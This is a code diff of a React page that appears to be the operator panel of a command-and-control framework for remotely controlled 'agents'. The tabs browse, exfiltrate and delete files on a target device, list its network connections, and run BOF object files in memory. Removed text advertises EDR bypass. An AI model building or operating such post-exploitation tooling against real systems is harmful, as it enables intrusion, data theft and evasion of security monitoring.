-                    <RefreshCw className={`w-3 h-3 ${pendingTasks.some(t => t.task_type === 'ls') ? 'animate-spin' : ''}`} />
-                    Refresh
-                  </button>
-                </div>
-              </div>
-
-
-              {/* Breadcrumbs Navigation */}
-              <div className="px-4 py-2 bg-black/20 border-b border-slate-800/50 flex items-center gap-2 shrink-0">
-                <button 
-                  onClick={() => handleQuickAction('ls', { path: agent.os === 'windows' ? 'C:\\' : '/' })}
-                  className="p-1 rounded hover:bg-white/5 text-slate-500 hover:text-white transition-colors"
-                >
-                  <HardDrive className="w-3 h-3" />
+          {/* ── Network Tab ── */}
+          {activeTab === 'network' && (
+            <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden', minHeight: 0, padding: 20 }}>
+              <div style={{ display: 'flex', gap: 10, marginBottom: 12, alignItems: 'center' }}>
+                <input type="text" placeholder="Search IP or status..." value={netSearchQuery} onChange={e => setNetSearchQuery(e.target.value)} className="input" style={{ flex: 1 }} />
+                <button onClick={() => handleQuickAction('netstat_json', {})} className="btn btn-primary">
+                  <RefreshCw size={14} /> Refresh Network
                 </button>
-                <ChevronRight className="w-3 h-3 text-slate-700" />
-                <div className="flex items-center gap-1 overflow-x-auto no-scrollbar py-1">
-                  {(getLatestLsResult()?.path || '').split(/[\\/]/).filter(Boolean).map((part, idx, arr) => {
-                    const isWindows = (getLatestLsResult()?.path || '').includes('\\') || agent.os === 'windows';
-                    const separator = isWindows ? '\\' : '/';
-                    
-                    return (
-                      <React.Fragment key={idx}>
-                        <button 
-                          onClick={() => {
-                            let targetPath = arr.slice(0, idx + 1).join(separator);
-                            // Add leading slash for linux if not a windows drive
-                            if (!isWindows) {
-                              targetPath = '/' + targetPath;
-                            } else if (targetPath.length === 2 && targetPath.endsWith(':')) {
-                                targetPath = targetPath + '\\'; // Handle C: -> C:\
-                            }
-                            handleQuickAction('ls', { path: targetPath });
-                          }}
-                          className="text-[10px] font-bold text-slate-400 hover:text-primary transition-colors whitespace-nowrap px-1 rounded hover:bg-white/5"
-                        >
-                          {part}
-                        </button>
-                        {idx < arr.length - 1 && <ChevronRight className="w-3 h-3 text-slate-700 shrink-0" />}
-                      </React.Fragment>
-                    );
-                  })}
-                </div>
               </div>
-              
-              <div className="flex-1 overflow-y-auto scrollbar-thin">
-                <table className="w-full text-left text-[11px] border-collapse">
-                  <thead className="bg-slate-900/80 text-slate-500 sticky top-0 z-10 backdrop-blur-md">
-                    <tr>
-                      <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider">Name</th>
-                      <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider w-24">Size</th>
-                      <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider w-32">Modified</th>
-                      <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider text-right w-24">Actions</th>
-                    </tr>
+              <div className="card scroll-area" style={{ flex: 1, minHeight: 0 }}>
+                <table className="dash-table">
+                  <thead>
+                    <tr><th>Proto</th><th>Local Address</th><th>Remote Address</th><th>State</th></tr>
                   </thead>
-                  <tbody className="divide-y divide-slate-800/50 relative">
-                    {pendingTasks.some(t => t.task_type === 'ls_json') && (
-                      <div className="absolute inset-0 z-20 bg-slate-950/60 backdrop-blur-sm flex flex-col items-center justify-center animate-in fade-in duration-300">
-                        <Loader2 className="w-8 h-8 text-primary animate-spin mb-4" />
-                        <span className="text-[10px] font-black text-white uppercase tracking-[0.3em]">Synchronizing...</span>
-                      </div>
-                    )}
-                    
-                    {!getLatestLsResult() ? (
-                      <tr>
-                        <td colSpan="4" className="py-20 text-center">
-                          <Loader2 className="w-6 h-6 text-primary animate-spin mx-auto mb-4" />
-                          <p className="text-[10px] text-slate-500 font-bold uppercase tracking-widest">Awaiting Manifest...</p>
-                        </td>
-                      </tr>
+                  <tbody>
+                    {netList ? (
+                      netList.filter(c => (c.local || '').includes(netSearchQuery) || (c.remote || '').includes(netSearchQuery) || (c.state || '').toLowerCase().includes(netSearchQuery.toLowerCase())).map((conn, i) => (
+                        <tr key={i}>
+                          <td><span className="type-badge">{conn.proto || 'TCP'}</span></td>
+                          <td style={{ fontFamily: 'var(--font-mono)', color: 'var(--color-text-header)' }}>{conn.local}</td>
+                          <td style={{ fontFamily: 'var(--font-mono)', color: 'var(--color-text-muted)' }}>{conn.remote}</td>
+                          <td><span className={`status-pill ${conn.state === 'ESTABLISHED' ? 'online' : 'offline'}`}>{conn.state}</span></td>
+                        </tr>
+                      ))
                     ) : (
-                      getLatestLsResult().files
-                        .filter(f => f.name.toLowerCase().includes(fileSearchQuery.toLowerCase()))
-                        .sort((a, b) => (b.is_dir ? 1 : 0) - (a.is_dir ? 1 : 0))
-                        .map((file, idx) => (
-                          <tr 
-                            key={idx} 
-                            className="hover:bg-white/5 transition-colors group cursor-pointer"
-                            onClick={() => {
-                              if(file.is_dir) {
-                                handleQuickAction('ls', { path: joinPath(getLatestLsResult().path, file.name) });
-                              }
-                            }}
-                          >
-                            <td className="px-5 py-2.5">
-                              <div className="flex items-center gap-3">
-                                <div className={`p-1.5 rounded ${
-                                  file.is_dir ? 'bg-amber-500/10 text-amber-500' : 
-                                  ['exe', 'dll', 'bat', 'sh', 'ps1'].includes(file.name.split('.').pop().toLowerCase()) ? 'bg-primary/10 text-primary' : 
-                                  ['txt', 'log', 'config', 'json', 'yaml', 'ini'].includes(file.name.split('.').pop().toLowerCase()) ? 'bg-emerald-500/10 text-emerald-500' :
-                                  'bg-slate-800 text-slate-500'
-                                }`}>
-                                  {file.is_dir ? <Folder className="w-3.5 h-3.5" /> : 
-                                   ['exe', 'dll', 'bat', 'sh', 'ps1'].includes(file.name.split('.').pop().toLowerCase()) ? <TerminalIcon className="w-3.5 h-3.5" /> :
-                                   ['txt', 'log', 'config', 'json', 'yaml', 'ini'].includes(file.name.split('.').pop().toLowerCase()) ? <FileText className="w-3.5 h-3.5" /> :
-                                   <ActivityIcon className="w-3.5 h-3.5" />}
-                                </div>
-                                <span className={`font-semibold ${file.is_dir ? 'text-slate-200' : 'text-slate-400'}`}>
-                                  {file.name}
-                                </span>
-                              </div>
+                      <tr><td colSpan={4} style={{ textAlign: 'center', padding: 40, color: 'var(--color-text-dim)' }}>No network data available. Click Refresh Network.</td></tr>
+                    )}
+                  </tbody>
+                </table>
+              </div>
+            </div>
+          )}
+
+          {/* ── Files Tab ── */}
+          {activeTab === 'files' && (
+            <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden', minHeight: 0, padding: 20 }}>
+              {/* Path bar & controls */}
+              <div style={{ display: 'flex', gap: 10, marginBottom: 12, alignItems: 'center' }}>
+                <button 
+                  onClick={() => {
+                    const currentPath = getLatestLsResult()?.path || '.';
+                    const parentPath = currentPath.split(/[\\/]/).slice(0, -1).join(currentPath.includes('\\') ? '\\' : '/') || '.';
+                    handleQuickAction('ls', { path: parentPath });
+                  }} 
+                  className="btn btn-secondary"
+                  style={{ padding: '6px 12px', fontSize: 11, display: 'flex', alignItems: 'center', gap: 4 }}
+                  title="Go to parent directory"
+                >
+                  <ChevronLeft size={14} /> Up
+                </button>
+                <div style={{ flex: 1, position: 'relative', display: 'flex', alignItems: 'center' }}>
+                  <input type="text" placeholder="Search directory..." value={fileSearchQuery} onChange={e => setFileSearchQuery(e.target.value)} className="input" style={{ width: '100%' }} />
+                </div>
+                <button onClick={() => handleQuickAction('ls', { path: getLatestLsResult()?.path || '.' })} className="btn btn-primary" style={{ padding: '6px 12px', fontSize: 11 }}>
+                  <RefreshCw size={14} /> Refresh Directory
+                </button>
+              </div>
+
+              {/* Current path indicator */}
+              {getLatestLsResult()?.path && (
+                <div style={{ fontSize: 11, fontFamily: 'var(--font-mono)', color: 'var(--color-text-dim)', marginBottom: 8, padding: '4px 8px', borderRadius: 4, background: 'var(--color-surface-raised)', border: '1px solid var(--color-border-muted)' }}>
+                  Location: <span style={{ color: 'var(--color-primary)', fontWeight: 600 }}>{getLatestLsResult().path}</span>
+                </div>
+              )}
+
+              <div className="card scroll-area" style={{ flex: 1, minHeight: 0 }}>
+                <table className="dash-table">
+                  <thead>
+                    <tr><th>Name</th><th>Size</th><th>Type</th><th style={{ textAlign: 'right', paddingRight: 16 }}>Actions</th></tr>
+                  </thead>
+                  <tbody>
+                    {getLatestLsResult()?.files ? (
+                      getLatestLsResult().files.filter(f => f.name?.toLowerCase().includes(fileSearchQuery.toLowerCase())).map((file, i) => {
+                        const fullFilePath = joinPath(getLatestLsResult().path, file.name);
+                        return (
+                          <tr key={i} onClick={() => file.is_dir && handleQuickAction('ls', { path: fullFilePath })} style={{ cursor: file.is_dir ? 'pointer' : 'default' }}>
+                            <td style={{ fontWeight: 600, color: file.is_dir ? 'var(--color-primary)' : 'var(--color-text)' }}>
+                              {file.is_dir ? '📁 ' : '📄 '}{file.name}
                             </td>
-                            <td className="px-5 py-2.5 font-mono text-slate-500">
-                              {file.is_dir ? '--' : formatFileSize(file.size)}
-                            </td>
-                            <td className="px-5 py-2.5 text-slate-600 font-mono text-[10px]">
-                              {file.mod_time ? format(new Date(file.mod_time), 'yyyy-MM-dd HH:mm') : '--'}
-                            </td>
-                            <td className="px-5 py-2.5 text-right">
-                              <div className="flex justify-end gap-1 opacity-0 group-hover:opacity-100 transition-opacity">
-                                {!file.is_dir && (
+                            <td style={{ fontFamily: 'var(--font-mono)', color: 'var(--color-text-muted)' }}>{file.size || '—'}</td>
+                            <td><span className="os-badge">{file.is_dir ? 'DIR' : 'FILE'}</span></td>
+                            <td style={{ textAlign: 'right', paddingRight: 12 }}>
+                              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'flex-end', gap: 6 }}>
+                                {file.is_dir ? (
+                                  <button onClick={(e) => { e.stopPropagation(); handleQuickAction('ls', { path: fullFilePath }); }} className="btn btn-secondary" style={{ padding: '3px 8px', fontSize: 10 }}>
+                                    Open
+                                  </button>
+                                ) : (
                                   <>
-                                    <button 
-                                      onClick={(e) => {
-                                        e.stopPropagation();
-                                        handleQuickAction('cat', { path: joinPath(getLatestLsResult().path, file.name) });
-                                        setActiveTab('console');
-                                      }}
-                                      className="p-1.5 rounded-lg hover:bg-primary/10 text-slate-500 hover:text-primary transition-all"
-                                      title="View Content"
-                                    >
-                                      <Monitor className="w-3.5 h-3.5" />
+                                    <button onClick={(e) => { e.stopPropagation(); handleQuickAction('cat', { path: fullFilePath }); }} className="btn btn-secondary" style={{ padding: '3px 8px', fontSize: 10 }} title="View text content">
+                                      View
                                     </button>
-                                    <button 
-                                      onClick={(e) => {
-                                        e.stopPropagation();
-                                        handleExfiltrate(file);
-                                      }}
-                                      className="p-1.5 rounded-lg hover:bg-emerald-500/10 text-slate-500 hover:text-emerald-400 transition-all"
-                                      title="Exfiltrate"
-                                    >
-                                      <Download className="w-3.5 h-3.5" />
+                                    <button onClick={(e) => { e.stopPropagation(); handleQuickAction('download', { path: fullFilePath }); }} className="btn btn-primary" style={{ padding: '3px 8px', fontSize: 10, display: 'flex', alignItems: 'center', gap: 4 }} title="Exfiltrate & Download file">
+                                      <Download size={11} /> Download
                                     </button>
                                   </>
                                 )}
-                                <button 
-                                  onClick={(e) => {
-                                    e.stopPropagation();
-                                    if(confirm(`Delete ${file.name}?`)) {
-                                      handleQuickAction('rm', { path: joinPath(getLatestLsResult().path, file.name) });
-                                    }
-                                  }}
-                                  className="p-1.5 rounded-lg hover:bg-red-500/10 text-slate-500 hover:text-red-400 transition-all"
-                                  title="Delete"
-                                >
-                                  <Trash2 className="w-3.5 h-3.5" />
+                                <button onClick={(e) => { 
+                                  e.stopPropagation(); 
+                                  if (confirm(`Are you sure you want to delete '${file.name}' from the target device?`)) {
+                                    handleQuickAction('rm', { path: fullFilePath }); 
+                                  }
+                                }} className="btn btn-danger" style={{ padding: '3px 8px', fontSize: 10, display: 'flex', alignItems: 'center', gap: 4 }} title="Delete item from target">
+                                  <Trash2 size={11} /> Delete
                                 </button>
-                              </div>
-                            </td>
-                          </tr>
-                        ))
-                    )}
-                  </tbody>
-                </table>
-              </div>
-            </div>
-          )}
-
-          {activeTab === 'network' && (
-            <div className="card flex-1 flex flex-col overflow-hidden relative border-slate-800/50">
-              <div className="px-4 py-2 border-b border-slate-800 flex items-center justify-between bg-slate-900/40 shrink-0 gap-4">
-                <div className="flex items-center gap-3">
-                  <div className="p-1.5 bg-primary/10 rounded-lg border border-primary/20">
-                    <Wifi className="w-3.5 h-3.5 text-primary" />
-                  </div>
-                  <div>
-                    <span className="text-xs font-bold text-white block leading-none">Network Auditor</span>
-                    <span className="text-[9px] text-slate-500 font-bold uppercase tracking-wider">
-                      {getLatestNetstatResult() ? `${getLatestNetstatResult().filter(c => 
-                        c.local.includes(netSearchQuery) || c.remote.includes(netSearchQuery) || c.state.toLowerCase().includes(netSearchQuery.toLowerCase())
-                      ).length} Connections` : 'Scanning...'}
-                    </span>
-                  </div>
-                </div>
-
-                <div className="flex items-center gap-6">
-                  <button
-                    onClick={() => setIsMonitoring(!isMonitoring)}
-                    className={`px-3 py-1.5 rounded-lg border flex items-center gap-3 transition-all ${
-                      isMonitoring 
-                        ? 'bg-sky-500/10 border-sky-500/30 text-sky-400' 
-                        : 'bg-slate-900 border-slate-800 text-slate-500 grayscale'
-                    }`}
-                  >
-                    <div className={`w-2 h-2 rounded-full ${isMonitoring ? 'bg-sky-400 shadow-[0_0_8px_#38bdf8]' : 'bg-slate-700'}`} />
-                    <span className="text-[9px] font-black uppercase tracking-[0.15em]">{isOnline ? 'TACTICAL MONITOR' : 'MONITOR IDLE'}</span>
-                  </button>
-
-                  <div className="flex-1 max-w-sm relative flex items-center gap-2">
-                    <div className="relative flex-1">
-                      <input 
-                        type="text" 
-                        placeholder="Search IPs or Ports..."
-                        value={netSearchQuery}
-                        onChange={(e) => setNetSearchQuery(e.target.value)}
-                        className="w-full bg-black/40 border border-slate-800 rounded-lg pl-9 pr-4 py-1.5 text-xs text-white outline-none focus:border-primary/50 transition-all"
-                      />
-                      <Search className="absolute left-3 top-2 w-3.5 h-3.5 text-slate-600" />
-                    </div>
-                    <button 
-                      onClick={() => handleQuickAction('netstat_json', {})}
-                      className="p-2 rounded-lg bg-slate-800 border border-slate-700 text-slate-400 hover:text-white hover:bg-slate-700 transition-all"
-                    >
-                      <RefreshCw className={`w-3.5 h-3.5 ${pendingTasks.some(t => t.task_type === 'netstat_json') ? 'animate-spin' : ''}`} />
-                    </button>
-                  </div>
-                </div>
-              </div>
-              
-              <div className="flex-1 overflow-y-auto scrollbar-thin">
-                <table className="w-full text-left text-[11px] border-collapse">
-                  <thead className="bg-slate-900/80 text-slate-500 sticky top-0 z-10 backdrop-blur-md">
-                    <tr>
-                      <th className="px-5 py-3 border-b border-slate-800 font-bold uppercase tracking-wider w-20 text-[10px] text-slate-500">Proto</th>
-                      <th className="px-5 py-3 border-b border-slate-800 font-bold uppercase tracking-wider text-[10px] text-slate-500">
-                        Local Address
-                      </th>
-                      <th className="px-5 py-3 border-b border-slate-800 font-bold uppercase tracking-wider text-[10px] text-slate-500">
-                        Remote Address
-                      </th>
-                      <th className="px-5 py-3 border-b border-slate-800 font-bold uppercase tracking-wider text-[10px] text-slate-500">Status</th>
-                      <th className="px-5 py-3 border-b border-slate-800 font-bold uppercase tracking-wider text-[10px] text-slate-500">PID/Process</th>
-                    </tr>
-                  </thead>
-                  <tbody className="divide-y divide-slate-800/50">
-                    {getLatestNetstatResult() ? (
-                      getLatestNetstatResult()
-                        .filter(c => 
-                          c.local.includes(netSearchQuery) || 
-                          c.remote.includes(netSearchQuery) || 
-                          c.state.toLowerCase().includes(netSearchQuery.toLowerCase())
-                        )
-                        .map((conn, idx) => {
-                          const connKey = `${conn.local}-${conn.remote}`;
-                          const isNew = highlightedNetKeys.has(connKey);
-                          
-                          return (
-                            <tr key={idx} className={`hover:bg-white/5 transition-colors group ${isNew ? 'bg-emerald-500/5 border-l-2 border-emerald-500' : ''}`}>
-                            <td className="px-5 py-4">
-                              <span className="px-2 py-0.5 rounded-md bg-sky-500/10 text-sky-400 text-[10px] font-black tracking-widest border border-sky-500/20">
-                                {conn.proto}
-                              </span>
-                            </td>
-                            <td className="px-5 py-4">
-                              <div className="flex flex-col">
-                                <span className="text-sky-400 text-lg font-black leading-tight tracking-tight">{conn.local.split(':')[1]}</span>
-                                <span className="text-slate-500 text-[10px] font-mono">{conn.local.split(':')[0]}</span>
-                              </div>
-                            </td>
-                            <td className="px-5 py-4">
-                              <div className="flex flex-col">
-                                <span className="text-slate-200 font-mono text-[13px]">{conn.remote.split(':')[0] || '0.0.0.0'}</span>
-                                <span className="text-slate-500 text-[10px] font-bold uppercase tracking-widest">Port: {conn.remote.split(':')[1] || '0'}</span>
-                              </div>
-                            </td>
-                            <td className="px-5 py-4">
-                              <span className={`px-3 py-1 rounded-full text-[9px] font-black uppercase tracking-[0.1em] border ${
-                                conn.state === 'ESTABLISHED' ? 'bg-emerald-500/10 text-emerald-500 border-emerald-500/20' :
-                                conn.state === 'LISTENING' ? 'bg-amber-500/10 text-amber-500 border-amber-500/20' :
-                                'bg-slate-800 text-slate-500 border-slate-700'
-                              }`}>
-                                {conn.state}
-                              </span>
-                            </td>
-                            <td className="px-5 py-4">
-                              <div className="flex items-center gap-2">
-                                <div className="p-1.5 rounded-lg bg-slate-800/50 border border-slate-700/50">
-                                  {conn.process && conn.process.toLowerCase().includes('system') ? <ShieldCheck className="w-3.5 h-3.5 text-slate-500" /> : 
-                                   conn.process && conn.process.toLowerCase().includes('mysql') ? <Database className="w-3.5 h-3.5 text-primary" /> :
-                                   <ActivityIcon className="w-3.5 h-3.5 text-slate-600" />}
-                                </div>
-                                <span className="text-xs font-bold text-slate-300 uppercase tracking-wide">{conn.process || 'System'}</span>
                               </div>
                             </td>
                           </tr>
                         );
                       })
                     ) : (
-                      <tr>
-                        <td colSpan="4" className="py-20 text-center">
-                          <Loader2 className="w-6 h-6 text-primary animate-spin mx-auto mb-4" />
-                          <p className="text-[10px] text-slate-500 font-bold uppercase tracking-widest">Auditing Active Sockets...</p>
-                        </td>
-                      </tr>
+                      <tr><td colSpan={4} style={{ textAlign: 'center', padding: 40, color: 'var(--color-text-dim)' }}>No file manifest loaded. Click Refresh Directory.</td></tr>
                     )}
                   </tbody>
                 </table>
@@ -1550,87 +753,53 @@ const AgentDetailPage = () => {
             </div>
           )}
 
+          {/* ── BOF Runner Tab ── */}
           {activeTab === 'bof' && (
-             <div className="card flex-1 flex flex-col overflow-hidden relative border-slate-800/50 p-12 items-center justify-center">
-                <div className="max-w-md w-full space-y-8 text-center animate-in fade-in zoom-in-95 duration-500">
-                  <div className="p-6 bg-primary/10 rounded-full w-24 h-24 mx-auto flex items-center justify-center border border-primary/20 shadow-[0_0_30px_rgba(var(--color-primary-rgb),0.2)]">
-                    <Zap className="w-10 h-10 text-primary" />
-                  </div>
-                  <div>
-                    <h2 className="text-2xl font-black text-white uppercase tracking-widest mb-2">In-Memory BOF Runner</h2>
-                    <p className="text-slate-500 text-sm">Execute unmanaged C object files directly in the agent's heap. Bypass EDR by running fileless post-exploitation tools.</p>
-                  </div>
-                  
-                  <div className="space-y-4">
-                    <div className="flex flex-col gap-2">
-                      <label className="text-[10px] font-black text-slate-500 uppercase tracking-widest text-left pl-1">Target Entry Point</label>
-                      <input 
-                        type="text" 
-                        placeholder="go (default)"
-                        className="w-full bg-black/40 border border-slate-800 rounded-xl px-4 py-3 text-white text-sm outline-none focus:border-primary/50 transition-all font-mono"
-                        id="bof-entry"
-                      />
-                    </div>
-                    
-                    <button 
-                      onClick={() => {
-                        const input = document.createElement('input');
-                        input.type = 'file';
-                        input.accept = '.o';
-                        input.onchange = async (e) => {
-                          const file = e.target.files[0];
-                          if (!file) return;
-                          const reader = new FileReader();
-                          reader.onload = async () => {
-                            const base64Data = reader.result.split(',')[1];
-                            const entryInput = document.getElementById('bof-entry');
-                            const entry = (entryInput && entryInput.value) || 'go';
-                            handleQuickAction('bof_run', { bof_data: base64Data, entry });
-                            setActiveTab('console');
-                          };
-                          reader.readAsDataURL(file);
-                        };
-                        input.click();
-                      }}
-                      className="w-full py-4 bg-primary text-white rounded-xl font-black uppercase tracking-[0.2em] text-xs hover:bg-primary-hover shadow-xl shadow-primary/20 transition-all flex items-center justify-center gap-3 active:scale-[0.98]"
-                    >
-                      <Download className="w-4 h-4" /> Load & Execute BOF
-                    </button>
-                  </div>
-                  
-                  <div className="pt-8 border-t border-slate-800/50">
-                    <div className="flex items-center gap-2 justify-center text-[9px] font-bold text-slate-600 uppercase tracking-widest">
-                      <ShieldCheck className="w-3 h-3" /> Reflective COFF Loading Active
-                    </div>
-                  </div>
+            <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyCenter: 'center', padding: 40 }}>
+              <div style={{ maxWidth: 400, width: '100%', margin: '0 auto', textAlign: 'center', display: 'flex', flexDirection: 'column', gap: 16 }}>
+                <div style={{ width: 48, height: 48, borderRadius: 12, background: 'rgba(59,130,246,0.1)', color: 'var(--color-primary)', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto' }}>
+                  <Zap size={24} />
                 </div>
-             </div>
+                <div>
+                  <h3 style={{ fontSize: 16, fontWeight: 700, color: 'var(--color-text-header)', marginBottom: 4 }}>In-Memory BOF Runner</h3>
+                  <p style={{ fontSize: 12, color: 'var(--color-text-muted)', lineHeight: 1.5 }}>Execute unmanaged C COFF object files directly in target memory.</p>
+                </div>
+                <input type="text" id="bof-entry" placeholder="Entry point (default: go)" className="input" />
+                <button onClick={() => {
+                  const input = document.createElement('input'); input.type = 'file'; input.accept = '.o';
+                  input.onchange = async (e) => {
+                    const file = e.target.files[0]; if (!file) return;
+                    const reader = new FileReader();
+                    reader.onload = async () => {
+                      const base64Data = reader.result.split(',')[1];
+                      const entryInput = document.getElementById('bof-entry');
+                      const entry = (entryInput && entryInput.value) || 'go';
+                      handleQuickAction('bof_run', { bof_data: base64Data, entry });
+                      setActiveTab('console');
+                    };
+                    reader.readAsDataURL(file);
+                  };
+                  input.click();
+                }} className="btn btn-primary" style={{ padding: '10px 16px' }}>
+                  <Download size={14} /> Select & Execute .O File
+                </button>
+              </div>
+            </div>
           )}
-          </div>
         </div>
       </div>
 
       {/* Floating Toast Notifications */}
-      <div className="fixed bottom-6 right-6 flex flex-col gap-3 z-50 pointer-events-none">
+      <div style={{ position: 'fixed', bottom: 20, right: 20, display: 'flex', flexDirection: 'column', gap: 8, zIndex: 99, pointerEvents: 'none' }}>
         {toasts.map(toast => (
-          <div 
-            key={toast.id}
-            className={`pointer-events-auto flex items-center gap-3 px-5 py-4 rounded-2xl border backdrop-blur-xl shadow-2xl animate-in slide-in-from-right duration-500 ${
-              toast.type === 'success' ? 'bg-emerald-500/10 border-emerald-500/20 text-emerald-400' :
-              toast.type === 'error' ? 'bg-red-500/10 border-red-500/20 text-red-400' :
-              'bg-slate-900/90 border-slate-800 text-slate-300'
-            }`}
-          >
-            {toast.type === 'success' ? <CheckCircle2 className="w-5 h-5" /> : 
-             toast.type === 'error' ? <AlertCircle className="w-5 h-5" /> : 
-             <ActivityIcon className="w-5 h-5" />}
-            <span className="text-xs font-bold uppercase tracking-wider">{toast.title}</span>
+          <div key={toast.id} style={{ pointerEvents: 'auto', padding: '10px 16px', borderRadius: 8, background: 'var(--color-surface)', border: '1px solid var(--color-border)', color: toast.type === 'success' ? 'var(--color-success)' : toast.type === 'error' ? 'var(--color-error)' : 'var(--color-text)', fontSize: 12, fontWeight: 600, display: 'flex', alignItems: 'center', gap: 8, boxShadow: '0 4px 16px rgba(0,0,0,0.3)' }}>
+            {toast.type === 'success' ? <CheckCircle2 size={14} /> : toast.type === 'error' ? <AlertCircle size={14} /> : <ActivityIcon size={14} />}
+            <span>{toast.title}</span>
           </div>
         ))}
       </div>
     </div>
   );
 };
-
 
 export default AgentDetailPage;
